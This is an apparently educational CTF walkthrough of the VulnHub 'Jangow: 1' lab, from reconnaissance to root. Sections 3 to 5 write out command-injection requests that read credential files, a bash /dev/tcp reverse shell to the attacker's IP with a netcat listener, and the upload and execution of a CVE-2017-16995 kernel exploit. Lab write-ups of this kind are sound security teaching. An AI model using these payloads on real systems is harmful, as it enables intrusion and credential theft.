# Jangow CTF - Complete Walkthrough

## Overview

**VM Name:** Jangow: 1  
**Source:** [VulnHub](https://www.vulnhub.com/entry/jangow-101,754/)  
**Difficulty:** Easy  
**Objective:** Capture the root flag

> *The secret to this box is enumeration!*

This CTF challenges participants to exploit a command injection vulnerability, extract hardcoded credentials from backup files, and leverage a kernel exploit to achieve root-level access.

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Application Analysis](#2-web-application-analysis)
3. [Command Injection & Credential Discovery](#3-command-injection--credential-discovery)
4. [Initial Access](#4-initial-access)
5. [Privilege Escalation](#5-privilege-escalation)
6. [Flags](#6-flags)

---

## 1. Reconnaissance

### Network Scanning

Initial network discovery using Nmap:

```bash
nmap -sS -sV -A -p- 10.0.2.14
```

**Key Findings:**

| Port | State | Service |
|------|-------|---------|
| 21   | Open  | vsFTPd 3.0.3 |
| 80   | Open  | Apache httpd 2.4.18 (Ubuntu) |

**Target IP:** `10.0.2.14`

Only two ports are exposed. The FTP service on port 21 will become critical later in the attack chain for uploading exploitation tools to the target system.

### Web Vulnerability Scan

```bash
nikto -h http://10.0.2.14
```

**Significant Discoveries:**
- Apache 2.4.18 — outdated and end-of-life
- Directory indexing enabled across the web root
- Missing security headers (`X-Frame-Options`, `X-Content-Type-Options`)
- Default Apache `icons/README` file exposed

---

## 2. Web Application Analysis

### Initial Enumeration

Browsing to `http://10.0.2.14` revealed directory indexing with a single folder:

```
site/
```

Exploring the site uncovered the following pages:

- `http://10.0.2.14/site/` — Main landing page
- `http://10.0.2.14/site/#about` — About section
- `http://10.0.2.14/site/#projects` — Projects section
- `http://10.0.2.14/site/busque.php?buscar=` — Search functionality

### Critical Discovery

The `busque.php` endpoint accepts a `buscar` parameter. Initial testing revealed that this parameter is passed directly to system commands — a textbook **OS Command Injection** vulnerability.

---

## 3. Command Injection & Credential Discovery

### Confirming Command Injection

```bash
curl http://10.0.2.14/site/busque.php?buscar=ls
```

**Output:**
```
assets
busque.php
css
index.html
js
wordpress
```

```bash
curl http://10.0.2.14/site/busque.php?buscar=pwd
```

**Output:** `/var/www/html/site`

The server is executing arbitrary commands as the `www-data` user.

### Extracting Database Credentials

A `wordpress` directory was found in the web root. Enumerating its contents:

```bash
curl http://10.0.2.14/site/busque.php?buscar=ls%20wordpress
```

**Output:**
```
config.php
index.html
```

Dumping the configuration file:

```bash
curl http://10.0.2.14/site/busque.php?buscar=cat%20wordpress/config.php
```

**First Credential Set Found:**
```php
$servername = "localhost";
$database = "desafio02";
$username = "desafio02";
$password = "abygurl69";
```

### First Flag

Enumerating user home directories revealed a flag file:

```bash
curl http://10.0.2.14/site/busque.php?buscar=ls%20/home
# Output: jangow01

curl http://10.0.2.14/site/busque.php?buscar=cat%20/home/jangow01/user.txt
```

**Flag 1 obtained:** `d41d8cd98f00b204e9800998ecf8427e`

### Discovering the Backup File

Attempting FTP login with the `desafio02` credentials failed. Further enumeration of the web root revealed a hidden backup file:

```bash
curl http://10.0.2.14/site/busque.php?buscar=ls%20-la%20/var/www/html
```

**Output:**
```
-rw-r--r-- 1 www-data www-data  336 Oct 31  2021 .backup
drwxr-xr-x 6 www-data www-data 4096 Jun 10  2021 site
```

```bash
curl http://10.0.2.14/site/busque.php?buscar=cat%20/var/www/html/.backup
```

**Second Credential Set Found:**
```php
$servername = "localhost";
$database = "jangow01";
$username = "jangow01";
$password = "abygurl69";
```

### FTP Access Confirmed

```bash
ftp 10.0.2.14
Name: jangow01
Password: abygurl69
230 Login successful.
```

The `jangow01` credentials grant FTP access to the system — a key requirement for uploading exploitation tools later.

---

## 4. Initial Access

### Reverse Shell Deployment

With command injection confirmed, a reverse shell was prepared using a URL-encoded bash payload.

**Payload:**
```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.6/443 0>&1'
```

**Reference:** [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

**URL-Encoded:**
```
%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.6%2F443%200%3E%261%27
```

**Attacker Machine — Start Listener:**

```bash
nc -nvlp 443
listening on [any] 443 ...
```

**Trigger Reverse Shell:**

```bash
curl "http://10.0.2.14/site/busque.php?buscar=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.6%2F443%200%3E%261%27"
```

**Connection Received:**

```bash
connect to [10.0.2.6] from (UNKNOWN) [10.0.2.14] 37316
www-data@jangow01:/var/www/html/site$
```

### Shell Stabilization & User Switching

```bash
export TERM=xterm
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Using the credentials obtained from `.backup`, switched to the `jangow01` user:

```bash
su jangow01
Password: abygurl69

jangow01@jangow01:/var/www/html/site$
```

---

## 5. Privilege Escalation

### Enumeration with LinPEAS

LinPEAS was uploaded to the target via FTP for automated privilege escalation discovery.

**Reference:** [LinPEAS — PEASS-ng](https://github.com/peass-ng/PEASS-ng)

**Attacker Machine:**

```bash
ftp 10.0.2.14
Name: jangow01
Password: abygurl69
ftp> cd /home/jangow01
ftp> put linpeas.sh
226 Transfer complete.
```

**Target Machine:**

```bash
jangow01@jangow01:~$ chmod +x linpeas.sh
jangow01@jangow01:~$ ./linpeas.sh
```

**Vulnerable CVEs Detected:**
- `[CVE-2017-16995]` eBPF_verifier
- `[CVE-2016-8655]` chocobo_root
- `[CVE-2016-5195]` dirtycow / dirtycow 2

### Kernel Exploit — CVE-2017-16995

The eBPF verifier bypass exploit was selected for exploitation.

**Reference:** [Exploit-DB 45010](https://www.exploit-db.com/exploits/45010)

**Upload exploit source via FTP:**

```bash
ftp 10.0.2.14
Name: jangow01
Password: abygurl69
ftp> cd /home/jangow01
ftp> put 45010.c
226 Transfer complete.
```

**Compile and execute on target:**

```bash
jangow01@jangow01:~$ gcc 45010.c -o cve
jangow01@jangow01:~$ ./cve
```

**Exploit Output:**
```
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88003cd6fc00
[*] Leaking sock struct from ffff88003d1f4b40
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88003cecd480
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff88003cecd480
[*] credentials patched, launching shell...
```

### Root Flag

```bash
# whoami
root

# cd /root
# cat proof.txt
```

**Flag 2 obtained:** `da39a3ee5e6b4b0d3255bfef95601890afd80709`

---

## 6. Flags

| Flag | Location | Value |
|------|----------|-------|
| Flag 1 | `/home/jangow01/user.txt` | `d41d8cd98f00b204e9800998ecf8427e` |
| Flag 2 (Root) | `/root/proof.txt` | `da39a3ee5e6b4b0d3255bfef95601890afd80709` |

---

## Key Takeaways

### Vulnerabilities Exploited

1. **OS Command Injection** — `busque.php` passes user input directly to system commands with no sanitization
2. **Hardcoded Credentials** — Database passwords stored in plain text in `config.php` and reused for system accounts
3. **Information Disclosure** — Directory indexing and an exposed `.backup` file leaked sensitive credentials
4. **Insecure File Permissions** — Backup and configuration files were world-readable
5. **Kernel Vulnerability (CVE-2017-16995)** — Unpatched kernel allowed unprivileged privilege escalation to root via eBPF verifier bypass

### Attack Chain Summary

```
Directory indexing & web enumeration
    ↓
Command injection discovery (busque.php)
    ↓
Credential extraction (wordpress/config.php)
    ↓
Flag 1 capture (/home/jangow01/user.txt)
    ↓
.backup file discovery (/var/www/html/.backup)
    ↓
Second credential set extraction (jangow01:abygurl69)
    ↓
FTP access established
    ↓
Reverse shell via command injection (www-data)
    ↓
User escalation (www-data → jangow01)
    ↓
LinPEAS enumeration (CVE discovery)
    ↓
Exploit upload via FTP (45010.c)
    ↓
Kernel exploit execution (CVE-2017-16995)
    ↓
Root access & Flag 2 capture (/root/proof.txt)
```

### Security Recommendations

- Never pass user input directly to system commands — use parameterized approaches and strict input validation
- Remove or protect backup files from web-accessible directories
- Disable directory indexing on Apache (`Options -Indexes`)
- Never hardcode or reuse credentials across services
- Keep kernel and all system software patched and up to date
- Restrict FTP access; prefer SFTP with key-based authentication
- Implement Web Application Firewall (WAF) rules to block command injection patterns

---

## Tools Used

- **Nmap** - Network scanning and service enumeration
- **Nikto** - Web server vulnerability scanner
- **curl** - HTTP requests and command injection exploitation
- **FTP** - File upload/download for credential access and tool deployment
- **Netcat** - Reverse shell listener
- **Python 3** - Shell stabilization (PTY module)
- **LinPEAS** - Linux privilege escalation enumeration
- **GCC** - Compiling the CVE-2017-16995 exploit

---

## References

- VulnHub: https://www.vulnhub.com/entry/jangow-101,754/
- Exploit-DB 45010: https://www.exploit-db.com/exploits/45010
- LinPEAS: https://github.com/peass-ng/PEASS-ng
- Reverse Shell Cheat Sheet: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection

---

## Author

**0xCr0nu5**  
Connect with me: [GitHub](https://github.com/0xCr0nu5)

---

*Disclaimer: This writeup is for educational purposes only. Always obtain proper authorization before testing security on any system.*
